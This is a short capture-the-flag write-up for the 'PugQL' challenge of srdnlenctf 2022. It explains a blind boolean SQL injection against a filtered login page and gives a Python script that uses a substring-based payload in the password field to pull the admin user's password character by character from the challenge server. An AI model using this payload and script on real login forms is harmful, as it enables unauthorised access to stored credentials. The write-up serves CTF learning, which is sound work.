# srdnlenctf 2022

## PugQL (X solves)

This challenge provides a login page in which some security filters are applied in order to maintain the access secure. The filters are not quite good so it is possible to use sql injections to exfiltrate the flag which is in the Mario's password.

### Solution

To exfiltrate the flag, we can use the substring sql function in the password field, so if the condition is true, the site will render the successful login page, else it will render the page 'Hacking Attempt Detected'.

### Exploit

```python
#!/bin/env python3

import requests as r
import string

url = 'pugql.challs.srdnlenctf.it'

payload = "1' or substring(HEX((select password from users where username='Mario')),{},1)='{}" 

alf = string.ascii_letters + string.digits + '{' + '}' + '_'

flag = ''

for i in range(100): 
    for a in alf: #loop through characters
        data = {
            "username":'Mario',
            "password":payload.format(i+1,a)
        }
        r1 = r.post(url=url, data=data)
        if "Hello" in r1.text: #successful case
            flag += a
            print(flag, end='\r')
            break

print(flag)
```
